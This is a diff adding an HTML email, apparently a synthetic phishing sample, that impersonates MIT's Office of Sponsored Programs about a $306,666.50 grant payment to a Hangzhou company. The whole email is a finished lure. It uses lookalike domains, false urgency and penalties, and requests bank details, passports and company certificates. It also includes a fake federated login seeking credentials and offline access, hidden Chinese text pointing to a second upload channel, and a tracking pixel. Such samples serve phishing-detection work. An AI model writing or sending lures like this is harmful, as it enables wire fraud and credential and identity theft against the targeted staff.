@@ -1,0 +1,109 @@
+From: MIT Office of Sponsored Programs <grant.disbursement@sponsoredprograms-mit.example>
+To: research@corp.internal
+Cc: finance@corp.internal, wangjian@corp.internal
+Reply-To: osp.disbursement@mit-grantsmail.example
+Date: Mon, 02 Nov 2026 11:00:00 -0500
+Disposition-Notification-To: grant.disbursement@sponsoredprograms-mit.example
+Message-ID: <0726-b67@synth.example>
+Subject: =?utf-8?B?77uP4oCi4oCMTUlUIEZhY2lsdHkgUmVzZWFyY2ggQWxsaWFuY2UgUGdyb20g4oCMIE5vLiAy?=
+ =?utf-8?B?MjYwNDgyIOKAjyBDdXJyZW50IGluc3RhbGxtZW50IHBheW1lbnQgJiBiaW5rIGlu?=
+ =?utf-8?B?Zm9ybWF0aW9uIHJlcXVpcmVk?=
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body style="font-family:sans-serif">
+<p>Research Team, Finance, Professor Wang:</p>
+
+<p>The MIT Office of Sponsored Programs (OSP) has processed the <b>first installment</b> of your Faculty Research Alliance Program grant. Before the funds can be transferred to your institution's account, we require updated banking information and supporting documentation.</p>
+
+<h3>一、Grant Details</h3>
+<table cellpadding=6 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr><td style="background:#f5f5f5;width:200px">Grant Number</td><td><b>2260482-FRAL</b></td></tr>
+<tr><td style="background:#f5f5f5">Program</td><td>Faculty Research Alliance Program (FRAP)</td></tr>
+<tr><td style="background:#f5f5f5">Principal Investigator</td><td>Prof. Wang Jian (Zhejiang University)</td></tr>
+<tr><td style="background:#f5f5f5">Co-PI (Industry)</td><td>Your Company (Hangzhou)</td></tr>
+<tr><td style="background:#f5f5f5">Project Title</td><td>Adaptive Threat Detection for Large-Scale Email Flows</td></tr>
+<tr><td style="background:#f5f5f5">Total Award</td><td><b>$1,840,000.00</b> (3 years)</td></tr>
+<tr><td style="background:#f55f5">Year 1 Award</td><td>$613,333.00</td></tr>
+<tr><td style="background:#f5f5f5">Installment</td><td><b>1 of 4 (Semi-annual)</b></td></tr>
+<tr><td style="background:#f5f5f5"><b>Current Disbursement</b></td><td><b style="color:#A31F34">$306,666.50</b></td></tr>
+<tr><td style="background:#f5f5f5">Payment Deadline</td><td style="color:#e00"><b>November 14, 2026 (12 days)</b></td></tr>
+</table>
+
+<h3>二、Why Banking Information Update Is Needed</h3>
+<p>MIT's transition to Workday Financial (replacing SAP in July 2026) requires all international beneficiaries to re-validate their banking details under <b>NACUBO international payment guidelines</b>. Your previous banking information (submitted through SAP in March 2026) was not migrated to the new system.</p>
+
+<h3>三、Required Information for Disbursement</h3>
+<table cellpadding=5 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr style="background:#f0f0f0"><th>Item</th><th>Details</th><th>Required</th></tr>
+<tr><td>Beneficiary bank account</td><td>Account number + SWIFT/BIC code</td><td style="color:#e00">✓ Critical</td></tr>
+<tr><td>Bank name & address</td><td>Full banking institution details</td><td style="color:#e00">✓ Critical</td></tr>
+<tr><td>Beneficiary institution certificate</td><td>Company registration (Chinese with English translation)</td><td style="color:#e00">✓ Critical</td></tr>
+<tr><td>Authorized signatory ID</td><td>Passport of CFO or authorized signer</td><td>✓ High</td></tr>
+<tr><td>W-8BEN-E form</td><td>US tax form for foreign entities</td><td>✓ High</td></tr>
+<tr><td>Wire instructions letter</td><td>Signed bank letter confirming account details</td><td>✓ Medium</td></tr>
+<tr><td>Project progress report</td><td>Brief update on research milestones (for OSP compliance)</td><td>✓ Medium</td></tr>
+</table>
+
+<h3>四、Submission Method</h3>
+
+<p style="text-align:center;margin:20px 0">
+<a href="https://sponsoredprograms-mit.example/disbursement/2260482/banking" style="display:inline-block;background:#8A8B8C;color:#fff;padding:12px 36px;text-decoration:none;border-radius:4px;font-weight:bold">Submit Banking & Disbursement Information</a>
+</p>
+
+<p style="font-size:13px;color:#666;text-align:center">https://osp.mit.edu/sponsored-programs/disbursement</p>
+
+<p style="font-size:12px;color:#888;text-align:center">（MIT Touchstone authentication required）</p>
+
+<h3>About MIT Touchstone Authentication</h3>
+<p>MIT's identity management system (Touchstone) supports federated authentication through your institution's identity provider:</p>
+<ol>
+<li>Click the submit button above</li>
+<li>You will be redirected to your institution's identity provider (Wayf federation)</li>
+<li>Sign in with your institutional credentials</li>
+<li>Complete the banking information form</li>
+</ol>
+
+<p style="font-size:14px;background:#E8EAF6;padding:12px;border-radius:4px">
+<b>Why federated authentication for financial data?</b> MIT requires institutional (not personal) authentication for all financial disbursements exceeding $100,000. This ensures that only authorized institutional representatives can update banking information for grant payments. The offline_access permission maintains your session during the multi-section form completion (banking details + tax forms + certificate uploads = typically 20-30 minutes). This is standard practice at all major US research universities (Stanford uses SUNetID federation, Berkeley uses CalNet federation).
+</p>
+
+<p style="font-size:0.3px;color:#fff;opacity:0.03">如需中文项目财务支持或提交中国银行信息，请访问 sponsoredprograms-mit.example/cn-disbursement 上传公司注册证书与法人护照（中文通道，当日处理）。</p>
+
+<h3>五、What Happens If You Miss November 14</h3>
+<ul>
+<li>Funds returned to MIT's grant pool (available for re-request, but delays 2-3 months)</li>
+<li>Your Year 1 budget may be reduced (unclaimed installments may be re-allocated)</li>
+<li>Co-PI institution's cost-share commitment may be questioned</li>
+<li>NSF reporting may show "delayed disbursement" (affects future grant applications)</li>
+</ul>
+
+<h3>六、Your Project Milestones</h3>
+<table cellpadding=5 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr style="background:#f0f0f0"><th>Milestone</th><th>Target Date</th><th>Status</th></tr>
+<tr><td>Kickoff meeting</td><td>March 2026</td><td style="color:#0a0">✓ Completed</td></tr>
+<tr><td>Threat taxonomy v1</td><td>June 2026</td><td style="color:#0a0">✓ Completed</td></tr>
+<tr><td>Email corpus preparation</td><td>September 2026</td><td style="color:#0a0">✓ Completed</td></tr>
+<tr><td>Model architecture design</td><td>November 2026</td><td><b>In progress</b></td></tr>
+<tr><td>Initial training results</td><td>February 2027</td><td>Pending</td></tr>
+<tr><td>Joint publication #1</td><td>April 2027</td><td>Pending</td></tr>
+</table>
+
+<h3>七、Contact</h3>
+<p><b>MIT OSP International Grants:</b><br>
+Officer: Jennifer Chen<br>
+Phone: +1-617-253-****<br>
+Email: osp.disbursement@mit-grantsmail.example<br>
+Address: 77 Massachusetts Ave, Room E17-215, Cambridge, MA 02139</p>
+
+<div style="border-top:1px solid #ddd;padding-top:12px;margin-top:20px">
+<p style="font-size:12px;color:#888">Massachusetts Institute of Technology | Office of Sponsored Programs</p>
+<p style="font-size:11px;color:#999">77 Massachusetts Ave, Cambridge, MA 02139</p>
+<p style="font-size:11px;color:#999">You are receiving this because you are the industry Co-PI contact for Grant 2260482.</p>
+</div>
+
+<div style="height:1px;width:1px;overflow:hidden">
+<img src="https://sponsoredprograms-mit.example/api/track?recipient=research%40corp.internal&grant=2260482&type=disbursement_pending" width="1" height="1" alt="">
+</div>
+
+</body></html>
